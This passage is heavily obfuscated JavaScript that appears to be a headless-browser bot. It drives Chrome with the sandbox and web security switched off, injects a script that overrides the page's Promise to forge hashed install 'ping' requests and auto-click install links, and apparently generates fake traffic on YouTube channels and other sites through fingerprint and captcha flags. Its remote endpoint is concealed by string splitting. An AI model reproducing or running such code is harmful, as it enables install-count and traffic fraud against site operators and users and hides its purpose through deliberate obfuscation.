0xb3 * 0x14] |= (0x9 * 0x2a7 + 0x2 * -0x1288 + 0xdb1 | 0x149 * -0x1d + -0x142e + 0x39b2 & L) << y[0x1e0 * 0xb + -0xb * -0x95 + -0x1b04 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x3 * 0x84a + 0x39 * -0x3d + 0x26b3 ? (this['block'] = P[0x19b3 + 0x1 * -0xd76 + 0x40f * -0x3], this['start'] = N - (-0x136f + -0x547 + -0x4fe * -0x5), this['hash'](), this['hashed'] = 0x443 * 0x3 + -0x2 * -0xb0b + -0x22de) : this['start'] = N;
                }
                return this['bytes'] > -0x1dd38f9c + 0x8bc * -0xbce9a + -0x4dca6b57 * -0x5 && (this['hBytes'] += this['bytes'] / (0x4f2a6838 + -0x3ea97e97 * 0x8 + 0x2a6218c80) << -0x16 * -0x15d + -0x170f + 0x1 * -0x6ef, this['bytes'] = this['bytes'] % (-0x4155a5b * -0x28 + -0x1c4ff5d3 * 0x4 + 0xcde9b914)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x2 * -0xf45 + 0x2 * 0x5e + 0x1dcf;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0xd * 0x17f + -0x146f + 0x27f2] = this['block'], J[K >> 0x18b0 + 0x1 * 0x1135 + -0x29e3] |= x[-0x2 * -0x944 + 0x6 * 0xce + 0x1759 * -0x1 & K], this['block'] = J[0x1bb1 + -0x1b8d + -0x14], K >= -0x4c * 0x6b + -0x255c + 0x38 * 0x13d && (this['hashed'] || this['hash'](), J[0x1755 + 0x220c + -0x3961] = this['block'], J[-0x5f2 * -0x5 + -0x3b + -0x1d6f] = J[0x46f * -0x7 + 0x1 * -0x1b63 + 0x3a6d] = J[-0x1 * -0x2612 + 0x459 * 0x5 + -0x3bcd] = J[-0x1039 * -0x1 + -0xf41 + -0xf5] = J[0xd * 0x1e9 + -0x1 * -0x1d73 + -0x3644] = J[-0x4 * -0xce + -0x69 + -0x2a * 0x11] = J[-0x1b7 * -0x13 + -0xbdd + -0x2 * 0xa59] = J[-0x47 * -0x2 + -0x2689 + -0x23 * -0x116] = J[-0x1a7 * -0xa + -0xb9e * -0x1 + 0x101 * -0x1c] = J[-0xb92 + -0xa7c + 0x1617] = J[-0x1bd7 + 0xb38 + 0x10a9] = J[0x433 * 0x7 + 0x25a5 + -0x42ff] = J[0x1b * -0x61 + 0x641 * 0x4 + 0x31 * -0x4d] = J[0x3 * 0x58a + 0x577 + -0x1608] = J[-0x2383 + 0x61 * -0x66 + 0x4a37] = J[-0x1cfe + 0x107 * -0x1a + 0xb27 * 0x5] = -0x12a9 + 0xaa2 + 0x807 * 0x1), J[-0x2 * 0x80d + -0x7ee * 0x2 + 0x2004] = this['hBytes'] << -0x20e + -0x1d19 * 0x1 + 0x1f2a | this['bytes'] >>> -0x261d + 0x19a4 + -0x64b * -0x2, J[-0x1d54 + 0x185 * -0x3 + 0x21f2] = this['bytes'] << -0x1c * 0x104 + -0x137 * 0x19 + 0x2 * 0x1d69, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x880 + -0x495 + -0x3db; J < -0xf1 + -0x4a * 0x62 + 0x1d95; ++J)
                K = Q[J - (-0x5f2 + 0xaa7 + -0x4b2)] ^ Q[J - (-0xd3f * 0x2 + 0x19c8 + 0xbe)] ^ Q[J - (-0x1 * 0x422 + 0x96 * 0x15 + -0x81e)] ^ Q[J - (0x29 * -0x7a + -0x31 * -0x7e + -0x484)], Q[J] = K << 0x29 * -0x70 + 0x1 * 0x140a + -0x219 | K >>> 0x1049 + 0x1 * 0x137e + -0x23a8;
              for (J = -0x4eb * 0x2 + -0x4 * -0x5ae + -0xce2; J < 0x21cf + 0x127f + 0x46 * -0xbf; J += -0x1 * -0x1058 + -0x1143 + -0x8 * -0x1e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2627 + 0x20bc + -0x46de | L >>> -0x47d + -0x1cc + 0x664) + (M & N | ~M & O) + P + (0x3f * 0x2726b01 + 0x1d7 * -0x26442b + 0x6c18f77 * 0x1) + Q[J] << 0x7c8 + -0x3 * 0x161 + -0x137 * 0x3) << 0x1 * 0x22f9 + 0x5b9 + -0x28ad | P >>> 0x6 * -0x4f2 + 0x3f * 0x2a + 0x1371) + (L & (M = M << 0x1 * 0x2091 + -0x13bc + 0xcb7 * -0x1 | M >>> 0xe16 + -0x2531 * -0x1 + -0x3345) | ~L & N) + O + (0xa1141fa0 + 0xc266f3 * 0x2c + 0x67fb57cb * -0x1) + Q[J + (-0x2382 + -0x94 * -0x3d + 0x3 * 0x15)] << 0x73 * -0x37 + 0x8ef * -0x1 + -0x10d2 * -0x2) << 0x1d * 0x5 + 0x1387 + -0x1413 | O >>> -0x6c6 + 0xc * -0x2d2 + 0x28b9) + (P & (L = L << -0x815 * 0x2 + -0x1 * 0x1ca5 + 0xd9 * 0x35 | L >>> -0x1e04 + 0x1 * 0x3f1 + 0x1a15) | ~P & M) + N + (0x5d767b93 + 0x3b93450b * -0x2 + 0x7432881c) + Q[J + (-0x720 + -0x174d + 0x1e6f)] << -0x5a * -0x61 + -0x1d35 + 0x7 * -0xb3) << -0x1a0b + 0x1408 + 0x608 | N >>> -0x1 * -0x228e + 0x1 * 0x1c57 + -0x3eca) + (O & (P = P << 0xbf0 + -0x1b * -0x152 + -0x2f78 | P >>> 0xc75 * 0x2 + -0x20 * -0x31 + -0x1f08) | ~O & L) + M + (-0x69810d03 + -0x6312bf8e + 0x16 * 0xd69bd5f) + Q[J + (0x1d3 + 0x1163 + -0x1333)] << -0x1f3a + 0x1022 + 0xf18) << 0x1835 + -0xaab + -0xd85 * 0x1 | M >>> -0xa0e + -0x1829 + -0x2e * -0xbf) + (N & (O = O << 0x3 * 0x79f + -0x17 * 0xd9 + 0x10 * -0x34 | O >>> 0x1 * -0x2c8 + -0x11a2 + 0x146c * 0x1) | ~N & P) + L + (-0x133b829 * 0x17 + 0xa78e60bb + -0x31665b73) + Q[J + (-0x1 * -0x1e8b + 0x2a * -0xad + -0x225)] << 0x8 * 0x1b + -0x16ac + -0x1fc * -0xb, N = N << -0x61f * -0x1 + -0x1ed8 + 0x1 * 0x18d7 | N >>> -0xfb7 + 0x1 * -0x300 + 0x12b9;
              for (; J < 0x15ea + 0x2 * -0xf59 + 0x8f0; J += 0xe4c * 0x2 + -0x9c2 + -0x1 * 0x12d1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb * -0x1a1 + -0x1508 + 0x26f8 | L >>> 0x2583 + 0x56f + -0x2ad7) + (M ^ N ^ O) + P + (-0xcaee232e * 0x1 + -0x4d6a7fa * -0x1d + 0xad77077d) + Q[J] << 0x1c66 + -0x1e * -0x8e + -0x2d0a) << -0x3 * 0x56f + 0x1599 + 0x547 * -0x1 | P >>> 0x248 * -0x8 + 0xf0 + 0x116b) + (L ^ (M = M << 0xbb5 + -0x53 * -0x71 + 0x2 * -0x181d | M >>> -0x98b + -0x6e9 + -0xe * -0x12d) ^ N) + O + (0xb768697d + -0x2b8dc6 * -0x3e5 + -0xf22da1fa * 0x1) + Q[J + (-0x33b + -0x2e0 + 0x61c)] << 0x1b67 + -0x2695 + 0xb2e) << 0x254d * 0x1 + -0x2607 + 0xbf | O >>> 0x10b7 + 0x611 * -0x4 + -0x1 * -0x7a8) + (P ^ (L = L << -0xf3d * 0x1 + -0xdd2 + -0x1d2d * -0x1 | L >>> -0xf84 + 0x1856 + -0x8d0) ^ M) + N + (0x6c4d59ee + -0x41e8f581 * -0x3 + 0x1961 * -0x7b0d0) + Q[J + (0xd * 0x23d + -0x130c + 0x3 * -0x359)] << 0x9 * 0x3d3 + 0x9b9 + -0x32 * 0xe2) << -0x33 * 0x7f + 0x1 * -0x2113 + 0x3a65 | N >>> 0x1a75 * -0x1 + 0x5d * -0x1f + 0x17 * 0x1a5) + (O ^ (P = P << -0x1a9d + 0x26ba * 0x1 + -0xbff | P >>> 0x742 + -0x3ec + 0x3 * -0x11c) ^ L) + M + (0x7b7a4140 + 0x7ff7e275 + 0x70474 * -0x1409) + Q[J + (-0x9f * -0x3 + 0x255a + -0x2734)] << -0x20d6 + -0x4ed * -0x5 + 0x835) << -0x65 * -0x16 + -0x1 * 0x1f3c + 0x1693 * 0x1 | M >>> -0x9c7 + 0x5ae + -0x434 * -0x1) + (N ^ (O = O << -0x197f + -0xee * -0x8 + 0x122d | O >>> -0x1e5 * -0x10 + -0x2 * 0x369 + -0x177c) ^ P) + L + (0x20e28175 * 0x1 + -0x378a3245 + 0x922b * 0xe9d3) + Q[J + (-0x2e * 0x1a + 0x15db + -0xf * 0x125)] << -0xdbe + -0x1271 + 0x202f, N = N << -0x1 * 0xe3 + 0x24f7 + -0x23f6 | N >>> -0x5 * -0x6cd + 0x1d8e + -0x3f8d;
              for (; J < -0x2 * -0x1191 + 0xb8d + -0x1 * 0x2e73; J += -0x10d5 + 0xb3 * -0x13 + -0x1 * -0x1e23)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x59 * 0x1 + 0x85d + -0x8b1 | L >>> 0x1 * 0x9c7 + 0x1 * -0x19f1 + 0x1045) + (M & N | M & O | N & O) + P - (0x5168907b * -0x2 + 0xd1084d7 + 0x106a4df43 * 0x1) + Q[J] << -0x2dd + 0x1c53 + 0x2 * -0xcbb) << 0xd01 * 0x2 + 0x4a2 + -0x3 * 0xa35 | P >>> 0x1 * -0x1007 + 0x2016 + 0x1 * -0xff4) + (L & (M = M << -0x2681 + -0x2bd * -0xd + 0x81 * 0x6 | M >>> 0x6a2 + -0x1be * 0x11 + 0x16fe) | L & N | M & N) + O - (0x6c0434ee + -0x467253de * -0x1 + 0x20c922d4 * -0x2) + Q[J + (0x25f2 + 0x1f3e + -0x452f)] << 0xd * 0x115 + 0xc73 + -0x1a84) << -0x1460 + 0x1848 + 0x5 * -0xc7 | O >>> -0x3c4 * 0xa + 0x1910 + -0xcb3 * -0x1) + (P & (L = L << 0x1 * -0x1462 + 0x7 * 0x2f6 + -0x3a | L >>> -0x2621 + -0xcd * -0x2e + -0x3 * -0x6f) | P & M | L & M) + N - (-0xb19e935b + 0xaa81 * 0xfd5a + 0x79c56825) + Q[J + (-0x1 * 0xe05 + -0x30 * 0x53 + 0x1d97)] << 0x116e + -0x1f77 + 0xe09) << -0x4e * 0x45 + -0x18d * 0x7 + -0x3 * -0xaa2 | N >>> 0x28c * 0x2 + 0x675 * 0x1 + -0xb72) + (O & (P = P << -0x8 * -0x484 + 0x14bd * 0x1 + -0x38bf | P >>> -0xfcf + 0x1a77 * 0x1 + -0x2 * 0x553) | O & L | P & L) + M - (0x108be3c1 + 0xc437 * -0xbe6b + 0x2c3df0 * 0x57a) + Q[J + (-0x1 * -0x10da + -0x164b + 0x574)] << -0x17bc + -0x1408 + 0x4 * 0xaf1) << -0x19bd * -0x1 + -0x39d * -0x9 + -0x3a3d | M >>> 0x10b + -0x1 * -0x14d9 + -0x743 * 0x3) + (N & (O = O << 0x5c9 + -0x34 * 0x26 + -0x7 * -0x4b | O >>> 0x8 * 0x31d + -0xf16 + -0x9d0) | N & P | O & P) + L - (0x308 * -0x270a3 + -0x263fb8b5 + 0x9e8969f1) + Q[J + (0x1965 + -0xdc6 + -0xb9b)] << -0x2 * 0xbc3 + -0x1 * -0xfdd + 0x7a9, N = N << 0x14b9 + 0x189e + -0x33 * 0xe3 | N >>> -0x11f * -0x7 + -0x206f + 0x1898;
              for (; J < 0x5f5 + -0x14 * 0x6c + 0x2cb; J += 0x1cf0 + 0xb0b + -0x27f6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x225 * 0x5 + -0x543 + -0x1 * -0x1001 | L >>> 0xaa * 0x26 + 0x21a2 + -0x3ac3) + (M ^ N ^ O) + P - (-0x10a41c3b + 0x2db08d86 + 0xc1 * 0x20959f) + Q[J] << 0x1d * 0x121 + 0x125 * 0xb + -0x2d54) << -0xa02 + -0x24b3 + 0x2eba | P >>> 0x72 * -0xa + 0x85f + -0x3d0) + (L ^ (M = M << 0x2 * -0x10a0 + 0x1960 + -0x155 * -0x6 | M >>> -0xf71 * -0x1 + -0xfb + -0xe74) ^ N) + O - (0x53192b * -0xc9 + 0x2f35c1f6 + 0x47a63ef7) + Q[J + (-0x2265 * 0x1 + -0x36d * 0x4 + -0x180d * -0x2)] << -0xc * -0x2ca + -0x13 * -0x1d9 + 0x4493 * -0x1) << 0x5d2 * -0x5 + -0x7 * -0x1d + 0x1c54 | O >>> 0x160f * 0x1 + -0x1a51 + 0x45d) + (P ^ (L = L << -0x89 * -0x6 + 0xf3 * 0x1b + -0x1cb9 | L >>> 0x2d7 * 0x9 + 0xc9a * -0x1 + 0xf * -0xdd) ^ M) + N - (-0x311b443e * 0x1 + 0x682d92c6 + -0xba882f * 0x2) + Q[J + (-0x1002 * -0x1 + -0x17e3 + -0x3 * -0x2a1)] << 0xe7b * -0x2 + 0x2156 + 0x2 * -0x230) << -0xf94 + 0x82 * 0x1e + -0x1 * -0x5d | N >>> -0x18aa + -0x2 * -0x2c6 + -0x103 * -0x13) + (O ^ (P = P << -0x1f * -0xf9 + -0x1456 + 0xd * -0xbf | P >>> 0x83b + -0x66a + -0x1cf) ^ L) + M - (0x1281a87 + -0x5905013 * -0x4 + 0x1e33e357) + Q[J + (-0x1df7 + 0x92c + 0x14ce)] << -0x3 * 0x69a + -0x10c1 + -0x248f * -0x1) << -0xf81 + 0x625 + 0x157 * 0x7 | M >>> 0x104a + -0xe * -0x28c + -0x241 * 0x17) + (N ^ (O = O << -0x332 + -0x32 * 0xaf + 0x257e | O >>> -0x39d + -0xb3 * 0x1d + 0x17e6) ^ P) + L - (0x2 * 0x17faadee + 0x5ddcb64d + -0x5834d3ff) + Q[J + (0xb * -0x181 + 0xe * 0x227 + 0x1 * -0xd93)] << 0x1bdf + -0x2065 + 0x486, N = N << 0x174d + 0x1 * 0x9c2 + 0x3a9 * -0x9 | N >>> -0x2 * 0xea3 + -0x811 + 0x1 * 0x2559;
              this['h0'] = this['h0'] + L << -0x1a93 * 0x1 + -0x1eb9 + 0x394c, this['h1'] = this['h1'] + M << -0x1995 * -0x1 + -0x1173 + -0x1 * 0x822, this['h2'] = this['h2'] + N << 0x1dc2 + -0x14e + 0x97c * -0x3, this['h3'] = this['h3'] + O << 0x4 * 0x2d1 + 0x189 * -0x5 + -0x397, this['h4'] = this['h4'] + P << 0x1f32 + 0x575 * 0x2 + 0x5 * -0x86c;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1440 + -0x1 * -0x472 + -0x1896 & -0xd74 + -0x1 * -0x46 + 0x1 * 0xd3d] + w[J >> -0x2 * -0x1378 + 0x1826 * 0x1 + -0x5ba * 0xb & -0x137a + -0x19d3 + 0x2d5c] + w[J >> -0x14f0 + 0xb * 0x14a + 0x36b * 0x2 & -0x3fd + -0x26ef + 0x2afb] + w[J >> -0x7be * 0x1 + 0x1c9d + 0x2f9 * -0x7 & 0x3 * 0x41d + -0x122c + -0x3a * -0x1a] + w[J >> 0x56c * 0x6 + 0x219e + -0x421a & -0x2c * -0x49 + 0x14da + -0x2157] + w[J >> 0x136 * -0x18 + -0xc4f * -0x2 + 0x47a & -0x6cd * -0x3 + -0x687 * -0x3 + -0x27ed] + w[J >> 0x7 * 0x49f + -0x14e * -0x1c + -0x44dd & 0x3 * -0xb03 + -0x38b + 0x24a3] + w[0x1b5c + -0x1a0b + -0x1 * 0x142 & J] + w[K >> 0x1 * -0xb11 + -0xd5c + 0x1889 * 0x1 & 0x74 * -0x3 + 0x16da + -0x156f] + w[K >> -0x16db + 0x2 * -0x2d8 + 0x1ca3 & -0x3cb + -0x30c + 0x6e6 * 0x1] + w[K >> -0x55d + -0x2089 + 0x2 * 0x12fd & -0x7 * -0x1a + 0x2d * 0xa7 + -0x1e02] + w[K >> 0x5 * -0x5c6 + 0xf59 + 0xd95 & -0x59e + -0x3d8 + 0x985 * 0x1] + w[K >> -0x11 * -0x12f + -0xcf * -0x25 + 0xed * -0x36 & 0x50d * 0x2 + 0x1 * -0x1f35 + -0x7 * -0x306] + w[K >> -0x1 * 0x153d + -0xfa6 + 0x24eb & -0x1bd7 + 0x2 * -0xcff + 0x2 * 0x1af2] + w[K >> 0x925 + 0x379 + 0x1 * -0xc9a & 0x4a * -0x20 + 0x170d + -0xdbe * 0x1] + w[-0x86a * -0x4 + 0x1741 + -0x38da & K] + w[L >> 0x761 * -0x1 + 0xc7 + 0x6b6 & 0x1b48 + 0x15ba + -0x30f3] + w[L >> -0x1091 + -0x4 * -0xcc + 0xd79 & 0x2350 + 0x3 * 0x6a1 + -0x3724] + w[L >> 0x551 + -0x1e0c + -0x18cf * -0x1 & 0x794 + 0xb * -0x1f5 + 0xe02] + w[L >> -0xeea + -0x4 * -0x232 + 0x632 & -0x1324 + -0x1859 + 0xe84 * 0x3] + w[L >> -0x44 * 0x56 + 0xa6 * -0xf + 0x32 * 0xa7 & -0x10eb + -0x1ac * -0x8 + 0x1cd * 0x2] + w[L >> 0x3ea * -0x1 + 0xbb7 + -0x75 * 0x11 & 0xa1 * 0x2c + -0x3db + 0xbe1 * -0x2] + w[L >> -0x1aee + -0x1 * -0x315 + 0x29 * 0x95 & -0x1147 * 0x2 + 0xcc0 + 0x15dd] + w[-0x125 * 0x1e + 0x1bd6 + 0x68f & L] + w[M >> -0x1 * 0x10dd + 0x701 * 0x2 + 0x2f7 & -0x26a6 + -0x1410 + 0x3ac5] + w[M >> 0x8b * 0x29 + -0x1461 * 0x1 + -0x1ca & 0x1583 * 0x1 + 0x88d * 0x3 + -0x2f1b] + w[M >> -0x14c7 + 0x29 * 0x81 + -0x32 * -0x1 & 0x493 * -0x7 + 0xc47 * -0x2 + 0x1c51 * 0x2] + w[M >> 0x53 * -0x78 + 0x7 * -0x95 + 0x1 * 0x2b0b & 0xfbb + -0x3 * 0x635 + 0x2f3] + w[M >> 0x1 * -0x2503 + 0x1502 + 0x100d & 0xeef * -0x1 + 0x1335 + -0x437] + w[M >> -0x5ba * -0x5 + 0xb6b * 0x3 + 0x1 * -0x3edb & 0x1053 + -0xd43 * 0x1 + 0x301 * -0x1] + w[M >> 0x2060 + 0x1992 + -0xa * 0x5cb & 0x45 * -0xd + -0x25e1 + 0x1 * 0x2971] + w[0xc2f + -0x4cf * -0x4 + -0x1f5c & M] + w[N >> -0x1da9 + -0xb * -0x137 + 0x1068 & 0x1 * 0x16eb + -0x1832 + 0x156] + w[N >> -0x8c3 + 0x1202 + -0x3 * 0x30d & 0xc7c + -0xb * 0x239 + -0x12 * -0xab] + w[N >> 0x130f + 0xd47 + 0x2 * -0x1021 & -0xec9 + -0x1a0f + 0x28e7] + w[N >> 0x1200 + -0x12e6 + 0xf6 & 0x26a3 + 0x1864 + 0x1f7c * -0x2] + w[N >> -0xadb + 0x1 * 0x806 + -0x43 * -0xb & 0x139e + -0x7c * 0x7 + -0x102b] + w[N >> -0x207a * 0x1 + -0xb24 + 0x2ba6 & -0x116e + 0x14 + 0x1169] + w[N >> 0x30b * -0xb + -0x2cf * -0x1 + -0x165 * -0x16 & 0x145b + 0x1 * 0x11c5 + -0x2611] + w[-0x1f1e + -0x1a01 + 0x392e & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x17d0 + -0x1 * -0x128f + 0x559 * 0x1 & -0x251f + -0x1 * -0x833 + 0x1deb,
                J >> -0x1 * -0x1b9d + 0x7 * 0x1bb + -0x27aa * 0x1 & -0x1d61 + -0x1251 + -0xf * -0x33f,
                J >> -0x2441 * -0x1 + 0xe9f + -0x32d8 & 0x1 * -0x29 + 0x5f2 + -0x4ca,
                -0x1187 + 0xe7 + -0xd * -0x15b & J,
                K >> 0xe0 * 0x18 + -0x242e + 0xf46 & -0x2203 + -0x9a9 * -0x3 + 0x607,
                K >> 0x281 * 0x4 + 0x1ec1 + -0x28b5 & 0xbd7 * 0x3 + -0x18e5 + 0x55 * -0x1d,
                K >> -0x6d2 * 0x2 + 0x2cb * 0x1 + 0xae1 * 0x1 & 0x7cc + -0xaf * -0xa + 0xda3 * -0x1,
                0xb80 + -0x8ed + -0x4 * 0x65 & K,
                L >> 0x4d * 0x2b + 0x2594 + -0x326b & -0xc5a * -0x2 + -0x12d1 + 0x4e4 * -0x1,
                L >> -0x152d + 0x1cc7 + 0x5 * -0x182 & 0x1f1 * -0x13 + -0x1d75 + 0x4357,
                L >> -0x3 * 0x2ae + 0x1 * -0x24c5 + -0x373 * -0xd & -0x1 * 0x75b + 0x161 * 0x12 + 0x1 * -0x1078,
                -0x22eb + -0x1 * 0x19e7 + 0x3dd1 & L,
                M >> 0xd3 * -0x9 + 0x18fe + 0xb3 * -0x19 & 0x1b9 * -0x7 + 0xc * 0x1ca + -0x2ce * 0x3,
                M >> -0x561 * -0x1 + -0x1a7b + -0x2 * -0xa95 & -0x249d + -0x2672 + 0x4c0e,
                M >> 0x1 * -0x589 + -0x1b9c + 0x212d & 0x240c + -0x773 + -0x1b9a,
                -0x17 * -0x175 + -0xc * 0x18 + -0x1f64 & M,
                N >> 0x1b48 + 0x10f * 0x17 + -0x3389 & 0x2 * -0x23c + -0x2676 + 0x5 * 0x8c9,
                N >> 0x2124 + -0x1711 + -0xa03 & 0x5f8 + 0x25bb + 0x6 * -0x71e,
                N >> 0x1e45 * -0x1 + 0x15 * 0xcf + -0x37 * -0x3e & 0x5b * -0x29 + -0x114d + 0xff * 0x21,
                -0xd60 + 0x24 * 0x95 + 0x5 * -0x151 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x19d0 + 0x503 * -0x7 + 0x959), (K = new DataView(J))['setUint32'](-0x1d3f + 0x1cd1 + 0x5 * 0x16, this['h0']), K['setUint32'](-0x20e8 + 0x24cd * -0x1 + 0x45b9, this['h1']), K['setUint32'](0x1085 * -0x1 + 0x314 * 0x1 + 0xd79, this['h2']), K['setUint32'](0x224 + 0x1 * -0x5 + -0x213, this['h3']), K['setUint32'](0x1d03 + 0x4 * -0x427 + -0x3 * 0x41d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1cd9 + -0xc58 * -0x3 + -0x5 * 0x1a3];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x6 * -0x236 + -0x268e + 0x8a3 * 0x6;
            J[-0x12d3 + 0x92f * -0x1 + 0x1c02]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xfcf * -0x1 + 0x21f2 + -0x1223] = L => {
              const X = b;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te'](X(0x18, 'AP$q') + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x22cd + 0x261c + -0x8 * 0x91d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x2150 + -0x931 + 0x2a82;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x4 * 0x7c9 + -0x793 + 0x2c93), Promise['resolve'](-0x1a76 + -0x1 * 0x71f + 0x2196);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x45f * -0x3 + -0x26d8 + -0x7 * -0x3ad; j < -0x119c + 0x71c + -0xa81 * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x1 * 0x2763 + -0xc1 * 0x35 + 0x1fd2 + (0x1 * 0x2063 + -0x1 * -0xd2b + 0x8e * -0x3d) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * -0x1ffd + 0x450 + 0xdd8 * 0x2) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + Y(0xd, 'TaXx') + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    Z(0xc) + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x148 * 0x15 + -0x1 * -0x1949 + -0x53 * -0x5; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const a0 = d;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j[a0(0x1b)] === this['length'] && j[a0(0x1d)](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function a() {
  const br = [
    'B2jQzwn0',
    'WRXQnSkwW7rmbmkXBmkD',
    'lwfYy2HPDgvJDa',
    'WP8zcSotu8kuWRC1WOHL',
    'v09xnJqPiefWCa',
    'ntent-deli',
    'DxrVlwjVB3n0lq',
    'mcaOv2LUzg93CW',
    'W49AehpdI8kT',
    'WORcKmo0WRtdQ3xcJcPv',
    'CCocl33dOM9FtCkbWRC',
    'vfHuyuiTzffNlq',
    'Ahr0Chm6lY93DW',
    'W55ueZJdPmkmWOhcS8ogda',
    'none',
    'WOq4W4uMs2/dUhLBjW',
    'easyfork.o',
    'document.d',
    'zwfZEwzVCMSUBW',
    'DSkgW73cLtvykCk2Fq8',
    'W7pcTNSKw18pW6xcRqS',
    'CguGpIbKAxyGpG',
    'W7/cN8kBBSkPia',
    'yxL0sgLmztbZnG',
    'WPpdLaFdSwdcHmkTWQnGia',
    'childNodes',
    'W6pdGMbbWOxcTce',
    'size',
    'Bg9Ylw5HBwvZlq',
    'clear',
    'WRxdS8ouCmkUxmoRWO1gW7i'
  ];
  a = function() {
    return br;
  };
  return a();
}
